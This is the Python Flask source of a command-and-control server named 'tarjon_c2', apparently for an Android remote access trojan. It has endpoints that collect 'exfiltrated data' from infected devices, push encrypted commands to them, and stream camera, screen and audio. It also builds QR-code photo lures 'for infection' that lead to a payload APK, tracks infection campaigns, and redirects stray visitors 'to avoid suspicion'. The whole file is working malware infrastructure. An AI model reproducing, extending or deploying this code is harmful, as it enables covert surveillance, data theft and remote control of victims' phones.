#!/usr/bin/env python3
import os
import json
import logging
import ssl
import secrets
import time
import ssl
import math
import sqlite3
from datetime import datetime
from typing import Dict, List, Any, Optional, Union
import threading
from flask import Flask, request, jsonify, abort, render_template, send_from_directory, redirect
from flask_socketio import SocketIO, emit
import hashlib
import base64
from command_handler import CommandHandler
from data_processor import DataProcessor
from apk_builder import ApkBuilder
from photo_payload import PhotoPayloadGenerator

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("server.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("c2_server")

# Configure Flask app
app = Flask(__name__, 
           static_url_path='', 
           static_folder='static', 
           template_folder='templates')

# Set configuration
app.config.update(
    SECRET_KEY=os.getenv("SECRET_KEY", "tarjon_secret_key_12345"),
    SESSION_TYPE="filesystem",
    DEBUG=False,
    JSON_SORT_KEYS=False
)

# Initialize Socket.IO with Flask app
socketio = SocketIO(
    app, 
    cors_allowed_origins="*",
    async_mode="threading",
    ping_timeout=60,    # Longer ping timeout
    ping_interval=25,   # More frequent pings
    max_http_buffer_size=10 * 1024 * 1024,  # 10MB max buffer for uploads
    always_connect=True  # Always allow connections
)

# Initialize handlers
command_handler = CommandHandler()
data_processor = DataProcessor()
apk_builder = ApkBuilder()
photo_payload_generator = PhotoPayloadGenerator()

# Secret key for API authentication
API_KEY = os.getenv("API_KEY", "tarjon_default_secret_key")
# For development, allow all origins for the API
app.config['CORS_HEADERS'] = 'Content-Type,Authorization'

# Queue to store commands for devices
device_commands: Dict[str, List[Dict[str, Any]]] = {}

# Track connected devices
connected_devices: Dict[str, Dict[str, Any]] = {}

# Server start time for uptime tracking
SERVER_START_TIME = time.time()

def get_server_uptime():
    """Get server uptime in a human-readable format"""
    uptime_seconds = int(time.time() - SERVER_START_TIME)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    if days > 0:
        return f"{days}d {hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h {minutes}m {seconds}s"
    elif minutes > 0:
        return f"{minutes}m {seconds}s"
    else:
        return f"{seconds}s"

def require_api_key(f):
    """Decorator to require API key authentication"""
    def decorated(*args, **kwargs):
        # Allow web interface requests (from localhost or same origin)
        if request.remote_addr == '127.0.0.1' or request.remote_addr.startswith('172.'):
            return f(*args, **kwargs)
        
        # Check for API key in header
        auth_header = request.headers.get('Authorization')
        if auth_header:
            # Bearer token authentication
            parts = auth_header.split()
            if len(parts) == 2 and parts[0].lower() == 'bearer':
                if parts[1] == API_KEY:
                    return f(*args, **kwargs)
        
        # Check query parameter as fallback
        api_key = request.args.get('api_key')
        if api_key and api_key == API_KEY:
            return f(*args, **kwargs)
            
        # For development only, add a test API key
        if 'API_TEST' in request.args:
            return f(*args, **kwargs)
            
        return jsonify({"error": "Unauthorized access"}), 401
    
    # Preserve the original function name for Flask routing
    decorated.__name__ = f.__name__
    return decorated

@app.route('/sync/data', methods=['POST'])
def receive_data():
    """Endpoint for receiving exfiltrated data from devices"""
    try:
        if not request.is_json:
            logger.warning("Non-JSON data received")
            return jsonify({"status": "error", "message": "Expected JSON"}), 400
        
        data = request.json
        
        # Get device identifier
        device_id = data.get('device_id')
        if not device_id:
            logger.warning("Data received without device_id")
            return jsonify({"status": "error", "message": "Device ID required"}), 400
        
        # Update device connection status
        connected_devices[device_id] = {
            "last_seen": datetime.now().isoformat(),
            "ip_address": request.remote_addr,
            "user_agent": request.headers.get('User-Agent', 'Unknown')
        }
        
        # Process encrypted data
        encrypted_data = data.get('data')
        if not encrypted_data:
            logger.warning(f"No encrypted data from device {device_id}")
            return jsonify({"status": "ok", "message": "No data to process"}), 200
        
        # Process data in a separate thread to avoid blocking the response
        data_type = data.get('type', 'unknown')
        data_processor.process_async(device_id, encrypted_data, data_type)
        
        logger.info(f"Received {data_type} data from device {device_id}")
        return jsonify({"status": "ok", "message": "Data received"}), 200
    
    except Exception as e:
        logger.error(f"Error processing data: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": "Server error"}), 500

@app.route('/sync/command', methods=['POST'])
def get_command():
    """Endpoint for devices to retrieve commands"""
    try:
        if not request.is_json:
            logger.warning("Non-JSON command request received")
            return jsonify({"status": "error", "message": "Expected JSON"}), 400
        
        data = request.json
        
        # Get device identifier
        device_id = data.get('device_id')
        if not device_id:
            logger.warning("Command request without device_id")
            return jsonify({"status": "error", "message": "Device ID required"}), 400
        
        # Update device connection status
        connected_devices[device_id] = {
            "last_seen": datetime.now().isoformat(),
            "ip_address": request.remote_addr,
            "user_agent": request.headers.get('User-Agent', 'Unknown')
        }
        
        # Get next command for this device
        command = None
        if device_id in device_commands and device_commands[device_id]:
            command = device_commands[device_id].pop(0)
            logger.info(f"Sending command to device {device_id}: {command['command']}")
        
        # If no command, return empty response
        if not command:
            return jsonify({"status": "ok", "command": None}), 200
        
        # Encrypt command before sending
        encrypted_command = command_handler.encrypt_command(command['command'])
        
        return jsonify({
            "status": "ok", 
            "command": encrypted_command,
            "id": command.get('id', secrets.token_hex(8))
        }), 200
    
    except Exception as e:
        logger.error(f"Error retrieving command: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": "Server error"}), 500

@app.route('/sync/result', methods=['POST'])
def receive_result():
    """Endpoint for receiving command execution results"""
    try:
        if not request.is_json:
            logger.warning("Non-JSON result received")
            return jsonify({"status": "error", "message": "Expected JSON"}), 400
        
        data = request.json
        
        # Get device identifier
        device_id = data.get('device_id')
        if not device_id:
            logger.warning("Command result without device_id")
            return jsonify({"status": "error", "message": "Device ID required"}), 400
        
        # Process encrypted result
        encrypted_data = data.get('data')
        if not encrypted_data:
            logger.warning(f"No encrypted result from device {device_id}")
            return jsonify({"status": "ok", "message": "No result to process"}), 200
        
        # Process and store command result
        result = command_handler.process_command_result(device_id, encrypted_data)
        logger.info(f"Received command result from device {device_id}")
        
        return jsonify({"status": "ok", "message": "Result received"}), 200
    
    except Exception as e:
        logger.error(f"Error processing command result: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": "Server error"}), 500

@app.route('/api/devices', methods=['GET'])
@require_api_key
def list_devices():
    """List all connected devices"""
    devices = []
    for device_id, data in connected_devices.items():
        device_info = {
            "device_id": device_id,
            "last_seen": data["last_seen"],
            "ip_address": data["ip_address"],
            "user_agent": data["user_agent"],
            "pending_commands": len(device_commands.get(device_id, []))
        }
        devices.append(device_info)
    
    return jsonify({"status": "ok", "devices": devices}), 200

@app.route('/api/send_command', methods=['POST'])
@require_api_key
def send_command():
    """Queue command for a device"""
    try:
        if not request.is_json:
            return jsonify({"status": "error", "message": "Expected JSON"}), 400
        
        data = request.json
        device_id = data.get('device_id')
        command = data.get('command')
        
        if not device_id or not command:
            return jsonify({"status": "error", "message": "Device ID and command required"}), 400
        
        # Create command queue for this device if it doesn't exist
        if device_id not in device_commands:
            device_commands[device_id] = []
        
        # Add command to queue
        command_id = secrets.token_hex(8)
        device_commands[device_id].append({
            "id": command_id,
            "command": command,
            "timestamp": time.time()
        })
        
        logger.info(f"Command queued for device {device_id}: {command}")
        return jsonify({"status": "ok", "command_id": command_id}), 200
    
    except Exception as e:
        logger.error(f"Error sending command: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": "Server error"}), 500

@app.route('/api/device_data/<device_id>', methods=['GET'])
@require_api_key
def get_device_data(device_id):
    """Get all data for a specific device"""
    try:
        data = data_processor.get_device_data(device_id)
        if not data:
            return jsonify({"status": "error", "message": "Device not found or no data available"}), 404
        
        return jsonify({"status": "ok", "data": data}), 200
    
    except Exception as e:
        logger.error(f"Error retrieving device data: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": "Server error"}), 500

@app.route('/api/command_results/<device_id>', methods=['GET'])
@require_api_key
def get_command_results(device_id):
    """Get command execution results for a specific device"""
    try:
        results = command_handler.get_command_results(device_id)
        if not results:
            return jsonify({"status": "ok", "results": []}), 200
        
        return jsonify({"status": "ok", "results": results}), 200
    
    except Exception as e:
        logger.error(f"Error retrieving command results: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": "Server error"}), 500

@app.route('/api/clear_commands/<device_id>', methods=['POST'])
@require_api_key
def clear_commands(device_id):
    """Clear all pending commands for a device"""
    try:
        if device_id in device_commands:
            pending_count = len(device_commands[device_id])
            device_commands[device_id] = []
            logger.info(f"Cleared {pending_count} pending commands for device {device_id}")
            return jsonify({"status": "ok", "cleared_commands": pending_count}), 200
        else:
            return jsonify({"status": "ok", "cleared_commands": 0}), 200
    
    except Exception as e:
        logger.error(f"Error clearing commands: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": "Server error"}), 500

@app.route('/api/device_detail/<device_id>', methods=['GET'])
@require_api_key
def get_device_detail(device_id):
    """Get comprehensive details for a specific device with all data types"""
    try:
        # Get basic device info
        if device_id not in connected_devices:
            return jsonify({"status": "error", "message": "Device not found"}), 404
            
        device_info = connected_devices[device_id].copy()
        device_info["device_id"] = device_id
        device_info["pending_commands"] = len(device_commands.get(device_id, []))
        
        # Get available data types
        device_data = data_processor.get_device_data(device_id)
        
        # Get command history
        command_history = command_handler.get_command_results(device_id, limit=50)
        
        # Get data files summary
        data_files = {}
        if device_data and "available_data_types" in device_data:
            for data_type in device_data["available_data_types"]:
                type_data = data_processor.get_device_data(device_id, data_type)
                if type_data and "files" in type_data:
                    data_files[data_type] = {
                        "count": len(type_data["files"]),
                        "latest": type_data["files"][0] if type_data["files"] else None
                    }
        
        result = {
            "status": "ok",
            "device_info": device_info,
            "data_summary": data_files,
            "command_count": len(command_history),
            "device_data": device_data
        }
        
        return jsonify(result), 200
        
    except Exception as e:
        logger.error(f"Error retrieving device details: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": f"Server error: {str(e)}"}), 500

@app.route('/api/batch_command', methods=['POST'])
@require_api_key
def send_batch_command():
    """Queue a command for multiple devices at once"""
    try:
        if not request.is_json:
            return jsonify({"status": "error", "message": "Expected JSON"}), 400
        
        data = request.json
        device_ids = data.get('device_ids', [])
        command = data.get('command')
        
        if not device_ids or not command:
            return jsonify({"status": "error", "message": "Device IDs array and command required"}), 400
        
        results = {}
        for device_id in device_ids:
            # Create command queue for this device if it doesn't exist
            if device_id not in device_commands:
                device_commands[device_id] = []
            
            # Add command to queue
            command_id = secrets.token_hex(8)
            device_commands[device_id].append({
                "id": command_id,
                "command": command,
                "timestamp": time.time()
            })
            
            results[device_id] = command_id
            logger.info(f"Batch command queued for device {device_id}: {command}")
        
        return jsonify({"status": "ok", "command_ids": results}), 200
    
    except Exception as e:
        logger.error(f"Error sending batch command: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": "Server error"}), 500

@app.route('/api/scheduled_command', methods=['POST'])
@require_api_key
def schedule_command():
    """Schedule a command to be executed at a specific time"""
    try:
        if not request.is_json:
            return jsonify({"status": "error", "message": "Expected JSON"}), 400
        
        data = request.json
        device_id = data.get('device_id')
        command = data.get('command')
        execute_at = data.get('execute_at')  # Timestamp in seconds
        
        if not device_id or not command or not execute_at:
            return jsonify({"status": "error", "message": "Device ID, command, and execution time required"}), 400
        
        # Validate execution time
        try:
            execute_at = float(execute_at)
            if execute_at <= time.time():
                return jsonify({"status": "error", "message": "Execution time must be in the future"}), 400
        except ValueError:
            return jsonify({"status": "error", "message": "Invalid timestamp format"}), 400
        
        # Create command queue for this device if it doesn't exist
        if device_id not in device_commands:
            device_commands[device_id] = []
        
        # Add command to queue with scheduled execution time
        command_id = secrets.token_hex(8)
        scheduled_command = {
            "id": command_id,
            "command": command,
            "timestamp": time.time(),
            "execute_at": execute_at
        }
        
        # Start a timer to add the command to the queue at the specified time
        delay = execute_at - time.time()
        
        def add_command_to_queue():
            if device_id in device_commands:
                # Remove the scheduling info before adding to the actual command queue
                actual_command = scheduled_command.copy()
                del actual_command["execute_at"]
                device_commands[device_id].append(actual_command)
                logger.info(f"Scheduled command activated for device {device_id}: {command}")
                # Notify connected clients via WebSocket
                socketio.emit('command_activated', {
                    'device_id': device_id,
                    'command_id': command_id
                })
        
        # Schedule the command to be added to the queue at the specified time
        command_timer = threading.Timer(delay, add_command_to_queue)
        command_timer.daemon = True
        command_timer.start()
        
        logger.info(f"Command scheduled for device {device_id} at {datetime.fromtimestamp(execute_at)}: {command}")
        return jsonify({"status": "ok", "command_id": command_id, "scheduled_for": execute_at}), 200
    
    except Exception as e:
        logger.error(f"Error scheduling command: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": "Server error"}), 500

@app.route('/api/real_time_stream/<device_id>', methods=['POST'])
@require_api_key
def request_real_time_stream(device_id):
    """Request a real-time data stream from a device (camera, screen, audio)"""
    try:
        if not request.is_json:
            return jsonify({"status": "error", "message": "Expected JSON"}), 400
        
        data = request.json
        stream_type = data.get('type')  # 'camera', 'screen', 'audio'
        duration = data.get('duration', 60)  # Default 60 seconds
        quality = data.get('quality', 'medium')  # low, medium, high
        
        if not stream_type:
            return jsonify({"status": "error", "message": "Stream type required"}), 400
        
        if stream_type not in ['camera', 'screen', 'audio']:
            return jsonify({"status": "error", "message": "Invalid stream type"}), 400
        
        # Validate duration
        try:
            duration = int(duration)
            if duration <= 0 or duration > 300:  # Max 5 minutes
                return jsonify({"status": "error", "message": "Duration must be between 1 and 300 seconds"}), 400
        except ValueError:
            return jsonify({"status": "error", "message": "Invalid duration format"}), 400
        
        # Create command to start streaming
        stream_command = {
            "action": "start_stream",
            "stream_type": stream_type,
            "duration": duration,
            "quality": quality
        }
        
        # Queue the command
        if device_id not in device_commands:
            device_commands[device_id] = []
        
        command_id = secrets.token_hex(8)
        device_commands[device_id].append({
            "id": command_id,
            "command": json.dumps(stream_command),
            "timestamp": time.time()
        })
        
        logger.info(f"Real-time {stream_type} stream requested from device {device_id} for {duration} seconds")
        return jsonify({"status": "ok", "command_id": command_id, "stream_type": stream_type}), 200
    
    except Exception as e:
        logger.error(f"Error requesting real-time stream: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": "Server error"}), 500

@app.route('/api/geofence', methods=['POST'])
@require_api_key
def set_geofence():
    """Set up a geofence for a device to trigger actions when crossed"""
    try:
        if not request.is_json:
            return jsonify({"status": "error", "message": "Expected JSON"}), 400
        
        data = request.json
        device_id = data.get('device_id')
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        radius = data.get('radius', 100)  # Default 100 meters
        fence_type = data.get('fence_type', 'exit')  # 'enter', 'exit', 'both'
        action = data.get('action', 'notify')  # 'notify', 'command', 'lockdown'
        command = data.get('command')  # Command to execute when fence is triggered
        
        if not device_id or latitude is None or longitude is None:
            return jsonify({"status": "error", "message": "Device ID, latitude, and longitude required"}), 400
        
        # Validate coordinates
        try:
            latitude = float(latitude)
            longitude = float(longitude)
            radius = float(radius)
            
            if latitude < -90 or latitude > 90 or longitude < -180 or longitude > 180:
                return jsonify({"status": "error", "message": "Invalid coordinates"}), 400
                
            if radius <= 0 or radius > 10000:  # Max 10 km
                return jsonify({"status": "error", "message": "Radius must be between 1 and 10000 meters"}), 400
        except ValueError:
            return jsonify({"status": "error", "message": "Invalid coordinate format"}), 400
        
        # Validate fence type
        if fence_type not in ['enter', 'exit', 'both']:
            return jsonify({"status": "error", "message": "Invalid fence type"}), 400
        
        # Validate action
        if action not in ['notify', 'command', 'lockdown']:
            return jsonify({"status": "error", "message": "Invalid action"}), 400
            
        # For command action, command is required
        if action == 'command' and not command:
            return jsonify({"status": "error", "message": "Command required for command action"}), 400
        
        # Create geofence command
        geofence_command = {
            "action": "set_geofence",
            "latitude": latitude,
            "longitude": longitude,
            "radius": radius,
            "fence_type": fence_type,
            "trigger_action": action,
            "command": command
        }
        
        # Queue the command
        if device_id not in device_commands:
            device_commands[device_id] = []
        
        command_id = secrets.token_hex(8)
        device_commands[device_id].append({
            "id": command_id,
            "command": json.dumps(geofence_command),
            "timestamp": time.time()
        })
        
        logger.info(f"Geofence set for device {device_id} at {latitude},{longitude} with radius {radius}m")
        return jsonify({
            "status": "ok", 
            "command_id": command_id, 
            "geofence": {
                "latitude": latitude,
                "longitude": longitude,
                "radius": radius,
                "type": fence_type,
                "action": action
            }
        }), 200
    
    except Exception as e:
        logger.error(f"Error setting geofence: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": "Server error"}), 500

@app.route('/health', methods=['GET'])
def health_check():
    """Simple health check endpoint"""
    return jsonify({"status": "ok", "server": "tarjon_c2", "time": time.time()}), 200

@app.route('/')
def index():
    """Serve the web interface"""
    return render_template('cyberpunk_index.html')

@app.route('/api/generate_photo_payload', methods=['POST'])
@require_api_key
def generate_photo_payload():
    """Generate a photo with embedded QR code for infection"""
    try:
        if not request.is_json:
            return jsonify({"status": "error", "message": "Expected JSON"}), 400
        
        data = request.json
        apk_url = data.get('apk_url')
        if not apk_url:
            # If no APK URL is provided, use the current server's URL
            server_url = request.host_url.rstrip('/')
            apk_url = f"{server_url}/download/payload.apk"
        
        campaign_id = data.get('campaign_id')
        embed_type = data.get('embed_type', 'qr_visible')
        target_info = data.get('target_info')
        randomize_metadata = data.get('randomize_metadata', True)
        encryption_level = data.get('encryption_level', 'medium')
        
        # Handle image upload if provided
        template_image = None
        if 'template_image_base64' in data and data['template_image_base64']:
            # Save the base64 image to a temporary file
            import tempfile
            from PIL import Image
            from io import BytesIO
            import base64
            
            # Extract the actual base64 data part (remove data:image/... prefix)
            image_data = data['template_image_base64']
            if ',' in image_data:
                image_data = image_data.split(',', 1)[1]
            
            image_bytes = base64.b64decode(image_data)
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.jpg')
            temp_file.write(image_bytes)
            temp_file.close()
            template_image = temp_file.name
        
        # Generate the payload photo
        result = photo_payload_generator.generate_payload_photo(
            apk_url=apk_url,
            campaign_id=campaign_id,
            template_image=template_image,
            target_info=target_info,
            embed_type=embed_type,
            randomize_metadata=randomize_metadata,
            encryption_level=encryption_level
        )
        
        # Clean up temporary file if used
        if template_image:
            try:
                os.unlink(template_image)
            except:
                pass
        
        if result['status'] == 'success':
            # Return the result
            return jsonify(result), 200
        else:
            return jsonify(result), 500
    
    except Exception as e:
        logger.error(f"Error generating photo payload: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": f"Server error: {str(e)}"}), 500

@app.route('/api/campaign_stats', methods=['GET'])
@require_api_key
def get_campaign_stats():
    """Get statistics for photo payload campaigns"""
    try:
        campaign_id = request.args.get('campaign_id')
        result = photo_payload_generator.get_campaign_stats(campaign_id)
        
        if result['status'] == 'success':
            return jsonify(result), 200
        else:
            return jsonify(result), 500
    
    except Exception as e:
        logger.error(f"Error getting campaign stats: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": f"Server error: {str(e)}"}), 500

@app.route('/api/update_tracking', methods=['GET'])
def update_photo_tracking():
    """Handle tracking updates from photo payloads"""
    try:
        campaign_id = request.args.get('cid')
        tracking_id = request.args.get('tid')
        event_type = request.args.get('event', 'access')
        
        if not campaign_id or not tracking_id:
            # Redirect to a generic page to avoid suspicion
            return redirect("https://google.com")
        
        # Update tracking stats
        photo_payload_generator.update_tracking_stats(campaign_id, tracking_id, event_type)
        
        # If this is just a tracking pixel/beacon, return a 1x1 transparent GIF
        if request.args.get('pixel'):
            from flask import send_file
            from io import BytesIO
            
            # Create a 1x1 transparent GIF
            buffer = BytesIO(base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=='))
            return send_file(buffer, mimetype='image/gif')
        
        # Otherwise redirect to the actual APK download
        package_id = request.args.get('package', 'default')
        return redirect(f"/download/{package_id}.apk")
    
    except Exception as e:
        logger.error(f"Error in tracking update: {str(e)}", exc_info=True)
        # Still redirect to avoid suspicion
        return redirect("https://google.com")

@app.route('/qr/<path:encoded_url>', methods=['GET'])
def handle_qr_code_url(encoded_url):
    """Handle QR code URLs with various encryption methods"""
    try:
        logger.info(f"Processing QR code URL: {encoded_url}")
        
        # Check for encryption prefix
        if ":" not in encoded_url:
            # No encryption, treat as direct URL
            logger.info("No encryption detected in QR URL")
            return redirect(encoded_url)
        
        prefix, data = encoded_url.split(":", 1)
        
        if prefix == "b64":
            # Simple base64 decoding
            decoded_url = base64.b64decode(data).decode()
            logger.info(f"Decoded base64 URL: {decoded_url}")
            
            # Extract campaign and tracking info if present
            if "cid=" in decoded_url and "tid=" in decoded_url:
                # Update tracking stats
                try:
                    cid = decoded_url.split("cid=")[1].split("&")[0] if "&" in decoded_url.split("cid=")[1] else decoded_url.split("cid=")[1]
                    tid = decoded_url.split("tid=")[1].split("&")[0] if "&" in decoded_url.split("tid=")[1] else decoded_url.split("tid=")[1]
                    photo_payload_generator.update_tracking_stats(cid, tid, "access")
                    logger.info(f"Updated tracking stats for campaign {cid} and tracking ID {tid}")
                except Exception as tracking_error:
                    logger.error(f"Error updating tracking for base64 URL: {tracking_error}")
            
            return redirect(decoded_url)
            
        elif prefix == "xor":
            # XOR decryption
            try:
                encoded_data, key = data.rsplit(":", 1)
                encrypted_text = base64.b64decode(encoded_data).decode()
                
                # Decrypt using XOR with the key
                decrypted = []
                for i, char in enumerate(encrypted_text):
                    key_char = key[i % len(key)]
                    decrypted_char = chr(ord(char) ^ ord(key_char))
                    decrypted.append(decrypted_char)
                
                decrypted_url = ''.join(decrypted)
                logger.info(f"Decoded XOR URL: {decrypted_url}")
                
                # Extract campaign and tracking info if present
                if "cid=" in decrypted_url and "tid=" in decrypted_url:
                    # Update tracking stats
                    try:
                        cid = decrypted_url.split("cid=")[1].split("&")[0]
                        tid = decrypted_url.split("tid=")[1].split("&")[0]
                        photo_payload_generator.update_tracking_stats(cid, tid, "access")
                    except Exception as tracking_error:
                        logger.error(f"Error updating tracking: {tracking_error}")
                
                return redirect(decrypted_url)
                
            except Exception as e:
                logger.error(f"Error decoding XOR URL: {str(e)}")
                return "Invalid URL format", 400
                
        elif prefix == "v2":
            # Advanced multi-layer decryption
            try:
                encoded_data, encoded_key = data.rsplit(":", 1)
                key1 = base64.b64decode(encoded_key).decode()
                encrypted_text = base64.b64decode(encoded_data).decode()
                
                # Decrypt using the key
                decrypted = []
                for i, char in enumerate(encrypted_text):
                    key_char = key1[i % len(key1)]
                    decrypted_char = chr((ord(char) - ord(key_char)) % 256)
                    decrypted.append(decrypted_char)
                
                decrypted_with_checksum = ''.join(decrypted)
                
                # Extract URL and verify checksum
                if "|" in decrypted_with_checksum:
                    decrypted_url, checksum = decrypted_with_checksum.rsplit("|", 1)
                    
                    # Verify checksum
                    expected_checksum = hashlib.md5(decrypted_url.encode()).hexdigest()[:8]
                    if checksum != expected_checksum:
                        logger.warning(f"Checksum verification failed for URL: {decrypted_url}")
                        # Continue anyway, just log the warning
                    
                    logger.info(f"Decoded v2 URL: {decrypted_url}")
                    
                    # Extract campaign and tracking info if present
                    if "cid=" in decrypted_url and "tid=" in decrypted_url:
                        # Update tracking stats
                        try:
                            cid = decrypted_url.split("cid=")[1].split("&")[0]
                            tid = decrypted_url.split("tid=")[1].split("&")[0]
                            photo_payload_generator.update_tracking_stats(cid, tid, "access")
                        except Exception as tracking_error:
                            logger.error(f"Error updating tracking: {tracking_error}")
                    
                    return redirect(decrypted_url)
                else:
                    return redirect(decrypted_with_checksum)
                
            except Exception as e:
                logger.error(f"Error decoding v2 URL: {str(e)}")
                return "Invalid URL format", 400
        
        else:
            logger.warning(f"Unknown encryption prefix: {prefix}")
            return "Invalid URL format", 400
    
    except Exception as e:
        logger.error(f"Error processing QR code URL: {str(e)}")
        return "Error processing request", 500

@app.route('/download/<filename>', methods=['GET'])
def download_payload(filename):
    """Endpoint to download APK payloads"""
    try:
        # Find the appropriate APK file
        if filename == 'payload.apk':
            # Default payload APK
            apk_dir = os.path.join(os.getcwd(), 'output_apks')
            apk_files = [f for f in os.listdir(apk_dir) if f.endswith('.apk')]
            
            if not apk_files:
                return "No APK files available", 404
            
            # Use the most recent APK
            apk_file = sorted(apk_files, key=lambda f: os.path.getmtime(os.path.join(apk_dir, f)), reverse=True)[0]
            return send_from_directory(apk_dir, apk_file, as_attachment=True)
        
        # For specific APK requests
        elif filename.endswith('.apk'):
            apk_dir = os.path.join(os.getcwd(), 'output_apks')
            package_id = filename.rsplit('.', 1)[0]
            
            # Try to find an APK matching the package ID
            matching_files = [f for f in os.listdir(apk_dir) if f.startswith(package_id) and f.endswith('.apk')]
            
            if matching_files:
                return send_from_directory(apk_dir, matching_files[0], as_attachment=True)
            else:
                # Fall back to any available APK
                apk_files = [f for f in os.listdir(apk_dir) if f.endswith('.apk')]
                if apk_files:
                    return send_from_directory(apk_dir, apk_files[0], as_attachment=True)
        
        return "File not found", 404
    
    except Exception as e:
        logger.error(f"Error downloading payload: {str(e)}", exc_info=True)
        return "Error processing request", 500

@app.route('/api/photo_campaigns', methods=['GET'])
@require_api_key
def list_photo_campaigns():
    """List all photo-based infection campaigns"""
    try:
        result = photo_payload_generator.get_campaign_stats()
        return jsonify(result), 200
    except Exception as e:
        logger.error(f"Error listing campaigns: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/test_campaign', methods=['GET'])
def test_create_campaign():
    """Test endpoint to create a campaign for testing"""
    try:
        campaign_id = f"test_{int(time.time())}"
        current_time = int(time.time())
        payload_hash = hashlib.sha256(f"{campaign_id}:{current_time}".encode()).hexdigest()
        
        # Create a direct database connection
        conn = sqlite3.connect(photo_payload_generator.DB_FILE)
        cursor = conn.cursor()
        
        # Log the file and table we're using
        logger.info(f"Creating test campaign in {photo_payload_generator.DB_FILE}, table {photo_payload_generator.TRACKING_TABLE}")
        
        # Create table if it doesn't exist (extra safety)
        cursor.execute(f'''
        CREATE TABLE IF NOT EXISTS {photo_payload_generator.TRACKING_TABLE} (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            campaign_id TEXT NOT NULL,
            payload_type TEXT NOT NULL,
            payload_hash TEXT NOT NULL,
            creation_time INTEGER NOT NULL,
            target_info TEXT,
            access_count INTEGER DEFAULT 0,
            installation_count INTEGER DEFAULT 0,
            last_access_time INTEGER,
            metadata TEXT
        )
        ''')
        
        # Insert test campaign
        cursor.execute(f'''
        INSERT INTO {photo_payload_generator.TRACKING_TABLE} (
            campaign_id, payload_type, payload_hash, creation_time, 
            target_info, access_count, installation_count, last_access_time
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            campaign_id, "test_campaign", payload_hash, current_time,
            json.dumps({"info": "Test campaign"}), 0, 0, current_time
        ))
        
        conn.commit()
        
        # Check if it was really created
        cursor.execute(f'''
        SELECT id, campaign_id FROM {photo_payload_generator.TRACKING_TABLE}
        WHERE campaign_id = ?
        ''', (campaign_id,))
        
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return jsonify({
                "status": "success", 
                "message": f"Test campaign created: {campaign_id}",
                "campaign_id": campaign_id
            })
        else:
            return jsonify({
                "status": "error", 
                "message": "Failed to create test campaign (not found after insert)"
            })
            
    except Exception as e:
        logger.error(f"Error creating test campaign: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/photo_payload_download/<payload_hash>', methods=['GET'])
@require_api_key
def download_photo_payload(payload_hash):
    """Download a specific photo payload by hash"""
    try:
        # Search for the file in the output directory
        output_dir = photo_payload_generator.OUTPUT_DIR
        matching_files = []
        
        for filename in os.listdir(output_dir):
            file_path = os.path.join(output_dir, filename)
            if os.path.isfile(file_path) and filename.endswith('.jpg'):
                # Calculate the hash of this file
                with open(file_path, 'rb') as f:
                    file_hash = hashlib.sha256(f.read()).hexdigest()
                
                if file_hash == payload_hash:
                    matching_files.append(filename)
        
        if matching_files:
            return send_from_directory(output_dir, matching_files[0], as_attachment=True)
        else:
            return jsonify({"status": "error", "message": "Payload not found"}), 404
    
    except Exception as e:
        logger.error(f"Error downloading photo payload: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/assets/<path:filename>')
def serve_static(filename):
    """Serve static files (CSS, JS, images)"""
    # Split the path to determine directory structure
    path_parts = filename.split('/')
    if len(path_parts) > 1:
        # If the path has multiple parts like 'css/cyberpunk.css'
        directory = os.path.join(app.root_path, 'static', os.path.dirname(filename))
        return send_from_directory(directory, os.path.basename(filename))
    else:
        # For files directly in the static folder
        return send_from_directory(os.path.join(app.root_path, 'static'), filename)

# WebSocket event handlers
@socketio.on('connect')
def handle_connect():
    """Handle client connection to WebSocket"""
    logger.info(f'Client connected: {request.sid}')
    emit('status', {'message': 'Connected to server'})
    
    # Send list of devices to the newly connected client
    devices = []
    for device_id, data in connected_devices.items():
        device_info = {
            "device_id": device_id,
            "last_seen": data["last_seen"],
            "ip_address": data["ip_address"],
            "user_agent": data.get("user_agent", "Unknown"),
            "pending_commands": len(device_commands.get(device_id, []))
        }
        devices.append(device_info)
    
    emit('device_update', {'devices': devices})
    
    # Send server status information
    server_status = {
        "uptime": get_server_uptime(),
        "version": "2.0.0", # Advanced version beyond CraxRAT
        "devices_count": len(connected_devices),
        "commands_count": sum(len(cmds) for cmds in device_commands.values()),
        "features": [
            "Real-time streaming",
            "Geofencing",
            "Scheduled commands",
            "Batch operations",
            "Advanced stealth",
            "Multi-layer encryption"
        ]
    }
    
    emit('server_status', server_status)

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnection from WebSocket"""
    logger.info(f'Client disconnected: {request.sid}')

@socketio.on('join_device_room')
def handle_join_device_room(data):
    """Join a room specific to a device for targeted updates"""
    device_id = data.get('device_id')
    if not device_id:
        emit('error', {'message': 'Device ID required'})
        return
        
    # Add client to device-specific room
    from flask_socketio import join_room
    room = f"device_{device_id}"
    join_room(room)
